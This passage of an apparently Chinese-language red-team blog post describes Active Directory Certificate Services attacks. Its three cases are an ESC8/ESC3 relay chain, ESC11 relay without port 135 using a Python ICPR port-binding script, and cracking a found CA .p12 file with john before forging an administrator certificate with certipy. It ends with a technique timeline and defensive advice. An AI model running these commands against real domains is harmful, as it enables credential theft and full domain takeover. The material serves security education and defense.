&lt;p&gt;結果顯示 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;corp-CA01-CA&lt;/code&gt; 這個 CA 存在 ESC8 弱點，該弱點爲 CA 的 HTTP 服務可被 relay，攻擊者可透過 coerce 手法例如 PetitPotam 強制讓 Domain Controller 等重要主機主動連線到攻擊者控制的機器，進而 relay 到 CA  的 HTTP 服務來取得憑證。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250410/11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;但 Domain Controller 可申請的憑證範本像是 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DomainController&lt;/code&gt; 或 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Machine&lt;/code&gt; 範本都沒有啟用在存在 ESC8 的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;corp-CA01-CA&lt;/code&gt; 上 (如下圖)，因此需要其他方式進行利用：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250410/12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;這時候我們注意到可串連類似 ESC3 的利用鏈。ESC3 的弱點在於憑證範本具備 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Certificate Request Agent&lt;/code&gt; EKU，當可成功申請這樣的憑證範本時，申請者可用申請到的憑證再以任意身分申請另一張憑證。從偵察結果，我們發現另一個網域 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;child1.corp.local&lt;/code&gt; 的一台機器  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ws01&lt;/code&gt; 可申請下列 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Template1&lt;/code&gt; 憑證，其滿足 Certified Pre-Owned 白皮書中除了申請權限之外的 ESC3 的第一張憑證範本條件：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250410/13.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;透過 ESC8，我們利用 PetitPotam 手法讓 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ws01&lt;/code&gt; 對我們控制的主機連線，進而 relay 到 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;corp-CA01-CA&lt;/code&gt; 申請 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Template1&lt;/code&gt; 憑證。&lt;/p&gt;

&lt;p&gt;ESC3 第二張憑證範本的條件則可用另一個網域 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;child2.corp.local&lt;/code&gt; 的主機向 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;corp-CA02-CA&lt;/code&gt; 申請取得。因此在成功獲得 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Template1&lt;/code&gt; 憑證後，藉由已控制的主機 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ws02.child2.corp.local&lt;/code&gt; 以 Enterprise Admins 的身分申請 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Template2&lt;/code&gt; 憑證範本，加上該憑證允許網域認證，確認獲得最高控制權。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250410/14.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;你可能會想問為什麼不能直接申請 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Template2&lt;/code&gt; 憑證，這是因為該憑證需要簽章，必須以帶有 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Certificate Request Agent&lt;/code&gt; EKU 的憑證申請，也就是透過 ESC8 申請的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Template1&lt;/code&gt; 憑證。&lt;/p&gt;

&lt;p&gt;從這個案例中，雖然弱點在於 ESC8，且單獨的弱點無法造成太大影響，但我們仍可搭配其他憑證加上內網橫向移動獲得的成果，一步步地滿足條件，最終取得目標權限。&lt;/p&gt;

&lt;h3 id=&quot;案例二沒有-135-port-的-esc11&quot;&gt;案例二：沒有 135 port 的 ESC11&lt;/h3&gt;

&lt;p&gt;ESC11 與 ESC8 類似，皆為 relay 攻擊。差別在於 ESC8 relay 的目標是 CA 的 HTTP 服務，而 ESC11 則是因為用於憑證相關操作的 ICPR 協定沒有強制加密的設定造成，攻擊本身是 relay 到 RPC 的介面 (TCP 135 port 及相關的高 port 等)。&lt;/p&gt;

&lt;p&gt;執行滲透過程時，我們遇到 CA 的 135 port 無法連線，但 certipy 透過 445 port 存取 remote registry 可以確認存在 ESC11 弱點。然而正常 RPC 流程會透過 135 port 的 Endpoint Mapper 來確認 ICPR 所使用的動態 port 來進行溝通，下圖以 49783 port 為例：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250410/15.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;問題：能不能在不對 135 port 連線的狀況下，存取 ICPR 來成功 relay 請求進而取得憑證？&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;回頭檢視 RPC 機制，在進行 ICPR 溝通時，會需要先對這個介面做 binding 並帶上 ICPR 介面的 UUID。若該介面不是 ICPR 則 binding 會失敗。&lt;/p&gt;

&lt;p&gt;我們可以直接對所有可能且開啟的 RPC port 進行 ICPR binding，預設為範圍是 49152 ~ 65535，成功 binding 的話即為 ICPR 介面：&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;impacket.dcerpc.v5&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;transport&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;impacket.uuid&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;uuidtup_to_bin&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;impacket.dcerpc.v5&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rpcrt&lt;/span&gt;


&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;icpr_check&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;target_ip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;MSRPC_UUID_ICPR&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;uuidtup_to_bin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;91ae6020-9e3c-11cf-8d7c-00aa00c091be&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;0.0&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;rpctransport&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;transport&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;DCERPCTransportFactory&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;ncacn_ip_tcp:&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;target_ip&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;]&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;rpctransport&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;setRemoteHost&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;target_ip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;rpctransport&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;set_connect_timeout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;dce&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rpctransport&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get_dce_rpc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;dce&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;set_auth_level&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rpcrt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;RPC_C_AUTHN_LEVEL_PKT_PRIVACY&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;dce&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;connect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;dce&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bind&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;MSRPC_UUID_ICPR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;except&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;False&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;# TODO: modify these variables
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ca_ip&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;10.1.1.101&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;open_ports&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;49664&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;49669&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;49670&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;49783&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;53661&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;port&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;open_ports&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;icpr_check&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ca_ip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;最後透過修改 &lt;a href=&quot;https://github.com/ly4k/Certipy/blob/4.8.2/certipy/commands/relay.py#L137&quot;&gt;certipy 程式碼&lt;/a&gt;到對應的 port 及 CA 的 IP 如下即可成功 relay 並取得憑證達成網域提權：&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stringbinding&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;ncacn_ip_tcp:&amp;lt;CA_IP&amp;gt;[&amp;lt;ICPR_PORT&amp;gt;]&quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;修改動態取得對應 port 的程式邏輯如附圖：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250410/16.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;案例三撿到私鑰&quot;&gt;案例三：撿到私鑰&lt;/h3&gt;

&lt;p&gt;我們也曾遇過幾次在橫向移動的過程撿到 PFX 或 P12 憑證檔案，它出現在公開的 SMB share 或特定我們有取得權限的主機檔案系統中。&lt;/p&gt;

&lt;p&gt;在一次紅隊演練取得外網進入點並建立 Tunnel 後，發現 Domain Controller 有多個額外的 SMB 分享資料夾且允許網域使用者存取。我們透過取得的帳號開始翻找各種可能的高價值檔案。在這之中，看到幾個與 CA 名稱相關的 P12 檔案。直覺和經驗告訴我們，這可能是非常關鍵的檔案，便在取得檔案後以 John the Ripper 破解憑證檔案的密碼：&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;pfx2john corp-CA01-CA.p12 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;hash
&lt;/span&gt;john &lt;span class=&quot;nt&quot;&gt;--wordlist&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;WORDLIST &lt;span class=&quot;nb&quot;&gt;hash&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250410/17.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;由於密碼強度不足，在成功破解後便能檢視其中的憑證資訊：&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;openssl pkcs12 &lt;span class=&quot;nt&quot;&gt;-in&lt;/span&gt; corp-CA01-CA.p12 &lt;span class=&quot;nt&quot;&gt;-nokeys&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-out&lt;/span&gt; corp-CA01-CA.crt
openssl x509 &lt;span class=&quot;nt&quot;&gt;-in&lt;/span&gt; corp-CA01-CA.crt &lt;span class=&quot;nt&quot;&gt;-text&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-noout&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;內容大致如下：&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Certificate:
    Data:
        Version: 3 (0x2)
        Serial Number:
            23:23:8f:98:da:e5:21:95:4d:59:49:af:23:b4:47:34
        Signature Algorithm: sha256WithRSAEncryption
        Issuer: DC=local, DC=corp, CN=corp-CA01-CA
        Validity
            Not Before: Dec  3 09:34:02 2024 GMT
            Not After : Dec  3 09:44:02 2029 GMT
        Subject: DC=local, DC=corp, CN=corp-CA01-CA
        Subject Public Key Info:
            Public Key Algorithm: rsaEncryption
                Public-Key: (2048 bit)
                Modulus:
                    00:ba:1e:cb:84:ff:5c:9d:91:09:75:38:40:ee:7f:
                    f7:1c:0b:bb:fd:91:81:f3:eb:07:3d:c9:93:39:a8:
...SNIP...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;從發行者 (Issuer) 及 Subject 可看出該憑證檔案對應到 AD CS 的 CA，便可嘗試以該私鑰偽造憑證並驗證身分：&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;certipy cert &lt;span class=&quot;nt&quot;&gt;-pfx&lt;/span&gt; corp-CA01-CA.p12 &lt;span class=&quot;nt&quot;&gt;-password&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;1qaz@WSX&apos;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-export&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-out&lt;/span&gt; corp-CA01-CA-nopass.p12
certipy forge &lt;span class=&quot;nt&quot;&gt;-ca-pfx&lt;/span&gt; corp-CA01-CA-nopass.p12 &lt;span class=&quot;nt&quot;&gt;-upn&lt;/span&gt; administrator@corp.local &lt;span class=&quot;nt&quot;&gt;-subject&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;CN=Administrator,CN=Users,DC=corp,DC=local&apos;&lt;/span&gt;

certipy auth &lt;span class=&quot;nt&quot;&gt;-pfx&lt;/span&gt; administrator_forged.pfx
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;最後經過 PKINIT 取得網域管理員的 NTHash 進行 Pass the Hash，成功偽造身分成爲 DA！&lt;/p&gt;

&lt;p&gt;這些情境常發生在備份時，匯出了憑證及私鑰，但卻沒有使用足夠複雜的密碼進行加密來保護，導致我們取得 root CA 及 Domain Controller 的私鑰等高權限的身分，因此可以任意偽造憑證或進行 DCSync 等操作進而取得整個網域的控制權。&lt;/p&gt;

&lt;h2 id=&quot;時間軸&quot;&gt;時間軸&lt;/h2&gt;

&lt;p&gt;以下整理從 2021 年 Certified Pre-Owned 白皮書發佈截至 2025 年 1 月的 AD CS 攻擊手法的演進：&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;時間&lt;/th&gt;
      &lt;th&gt;攻擊手法&lt;/th&gt;
      &lt;th&gt;備註&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;2021/06&lt;/td&gt;
      &lt;td&gt;&lt;a href=&quot;https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf&quot;&gt;Certified Pre-Owned&lt;/a&gt; ESC1 ~ ESC8&lt;/td&gt;
      &lt;td&gt;歸納了 AD CS 的各種手法，包含提權、Persistence，還有防禦及偵測的建議&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2021/06&lt;/td&gt;
      &lt;td&gt;&lt;a href=&quot;https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab&quot;&gt;Shadow Credential&lt;/a&gt;&lt;/td&gt;
      &lt;td&gt;透過寫入帳號的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;msDS-KeyCredentialLink&lt;/code&gt; 屬性來接管帳號的手法&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2022/02&lt;/td&gt;
      &lt;td&gt;&lt;a href=&quot;https://research.ifcr.dk/certipy-2-0-bloodhound-new-escalations-shadow-credentials-golden-certificates-and-more-34d1c26f0dc6&quot;&gt;Certipy 2.0&lt;/a&gt;&lt;/td&gt;
      &lt;td&gt;提到 certipy 新增的功能，以及一個簡潔的 ESC7 利用方式&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2022/05&lt;/td&gt;
      &lt;td&gt;&lt;a href=&quot;https://research.ifcr.dk/certifried-active-directory-domain-privilege-escalation-cve-2022-26923-9e098fe298f4&quot;&gt;Certifried: CVE-2022–26923&lt;/a&gt;&lt;/td&gt;
      &lt;td&gt;利用 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dNSHostName&lt;/code&gt; 及憑證 mapping 的機制達成網域提權漏洞&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2022/05&lt;/td&gt;
      &lt;td&gt;&lt;a href=&quot;https://support.microsoft.com/en-us/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16&quot;&gt;KB5014754&lt;/a&gt;&lt;/td&gt;
      &lt;td&gt;該 patch 修復 Certifried 漏洞，但也讓 ESC6 失效&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2022/08&lt;/td&gt;
      &lt;td&gt;&lt;a href=&quot;https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7&quot;&gt;ESC9 &amp;amp; ESC10&lt;/a&gt;&lt;/td&gt;
      &lt;td&gt;ESC6 失效後的延伸利用&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2022/11&lt;/td&gt;
      &lt;td&gt;&lt;a href=&quot;https://posts.specterops.io/certificates-and-pwnage-and-patches-oh-my-8ae0f4304c1d&quot;&gt;Certificates and Pwnage and Patches, Oh My!&lt;/a&gt;&lt;/td&gt;
      &lt;td&gt;提到前述手法的演進還有 patch 導致的一些利用技巧變化&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2022/11&lt;/td&gt;
      &lt;td&gt;&lt;a href=&quot;https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/?ref=heartburn.dev&quot;&gt;ESC11&lt;/a&gt;&lt;/td&gt;
      &lt;td&gt;ICPR 未強制加密的設定導致可能的 relay 攻擊&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2023/05&lt;/td&gt;
      &lt;td&gt;&lt;a href=&quot;https://posts.specterops.io/from-da-to-ea-with-esc5-f9f045aa105c&quot;&gt;From DA to EA with ESC5&lt;/a&gt;&lt;/td&gt;
      &lt;td&gt;從 Domain Admins 提權到 Enterprise Admins 的方式&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2023/10&lt;/td&gt;
      &lt;td&gt;&lt;a href=&quot;https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm&quot;&gt;ESC12&lt;/a&gt;&lt;/td&gt;
      &lt;td&gt;CA 若使用 YubiHSM2 ，可登入 CA 的使用者有機會取得解密的金鑰進而提升權限&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2024/02&lt;/td&gt;
      &lt;td&gt;&lt;a href=&quot;https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53&quot;&gt;ESC13&lt;/a&gt;&lt;/td&gt;
      &lt;td&gt;憑證範本若存在 issuance policy 且有相應的 OID group link 時的利用手法&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2024/02&lt;/td&gt;
      &lt;td&gt;&lt;a href=&quot;https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9&quot;&gt;ESC14&lt;/a&gt;&lt;/td&gt;
      &lt;td&gt;透過寫入 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;altSecurityIdentities&lt;/code&gt; 可達成帳號接管，並詳細解釋了 certificate mapping 的機制&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2024/11&lt;/td&gt;
      &lt;td&gt;&lt;a href=&quot;https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc&quot;&gt;ESC15 EKUwu&lt;/a&gt; CVE-2024-49019&lt;/td&gt;
      &lt;td&gt;發生在預設的舊版憑證範本使用者可添加自訂的 Application Policies，僅需申請權限便可提權&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h2 id=&quot;結語&quot;&gt;結語&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;AD CS 應納入 &lt;strong&gt;Tier 0 保護&lt;/strong&gt;，每個細節會影響你的網域安全，包含備份操作等。企業藍隊應考慮：
    &lt;ul&gt;
      &lt;li&gt;定期檢核所有憑證範本&lt;/li&gt;
      &lt;li&gt;停用所有廢棄的憑證範本&lt;/li&gt;
      &lt;li&gt;檢核憑證範本權限設定&lt;/li&gt;
      &lt;li&gt;高風險憑證啟用管理員授權申請&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;網路隔離很重要&lt;/strong&gt;，僅允許需要的連線，可大幅縮小攻擊面及駭客可活動的空間&lt;/li&gt;
  &lt;li&gt;單一的防禦機制並不一定能杜絕入侵，應&lt;strong&gt;思考是否有可能的方式&lt;/strong&gt;可以繞過防禦限制，或是讓我們幫你想吧！&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;references&quot;&gt;References&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://conf.devco.re/2024/keynote/DEVCORE-CONFERENCE-2024-Vtim-Taking-down-AD-in-minutes-things-that-you-missed-about-AD.pdf&quot;&gt;分分鐘拿下整個網域: 關於 AD，你還疏忽了什麼？&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf&quot;&gt;Certified Pre-Owned: Abusing Active Directory Certificate Services&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://posts.specterops.io/from-da-to-ea-with-esc5-f9f045aa105c&quot;&gt;From DA to EA with ESC5&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/dn786436(v=ws.11)&quot;&gt;Securing PKI: Planning a CA Hierarchy&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab&quot;&gt;Shadow Credentials: Abusing Key Trust Account Mapping for Account Takeover&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://research.ifcr.dk/certipy-2-0-bloodhound-new-escalations-shadow-credentials-golden-certificates-and-more-34d1c26f0dc6&quot;&gt;Certipy 2.0: BloodHound, New Escalations, Shadow Credentials, Golden Certificates, and more!&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://research.ifcr.dk/certifried-active-directory-domain-privilege-escalation-cve-2022-26923-9e098fe298f4&quot;&gt;Certifried: Active Directory Domain Privilege Escalation (CVE-2022–26923)&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://support.microsoft.com/en-us/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16&quot;&gt;KB5014754: Certificate-based authentication changes on Windows domain controllers&lt;/a&gt;&lt;/li&gt;
